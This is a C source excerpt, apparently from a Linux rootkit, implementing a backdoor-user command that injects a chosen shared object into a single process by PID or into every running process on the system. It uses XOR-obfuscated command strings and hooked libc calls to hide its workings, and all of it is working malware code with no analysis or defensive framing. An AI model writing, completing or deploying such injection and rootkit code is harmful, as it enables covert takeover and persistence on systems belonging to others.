void options_inject(const char *a0){
    char *s = xordup(validbdvcmds[BDVCMD_INJECT]);
    if(!s) exit(0);
    printf("  %s %s\n", a0, s);
    clean(s);
    exit(0);
}

/* from argv determine what bdusr wants to do. */
void doinjectso(char *const *argv){
    const char *sotarget;
    hook(CACCESS);
    !(sotarget = argv[2]) ? options_inject(argv[0]) : 0;
    if((long)call(CACCESS, sotarget, F_OK) != 0){
        xperror(ACCESS);
        exit(0);
    }

    const char *where;
    !(where = argv[3]) ? options_inject(argv[0]) : 0;

    char *allstring = xordup(NUL_ALL_STRING);
    if(!allstring) exit(0);
    int s = strcmp(allstring, where);
    clean(allstring);

    if(s == 0){
        pid_t *pids;
        u_int pcount;
        if((pids = allpids(&pcount)) != NULL){
            bxprintf(PROCESS_COUNT_NOTIFICATION, pcount);
            u_int injected = 0;
            for(uint p=0; p<pcount; p++)
                if(binject(pids[p], sotarget))
                    bxprintf(INJECTED_CSO_COUNT_STRING, sotarget, ++injected);
            printf("\n");
            free(pids);
        }
    }else{
        pid_t pid;
        !(pid = (pid_t)atoi(where)) ? options_inject(argv[0]) : 0;
        if(binject(pid, sotarget))
            bxprintf(PID_INJECTED_SUCCESS, sotarget, pid);
        else bxprintf(PID_INJECT_FAILED, sotarget, pid);
    }
}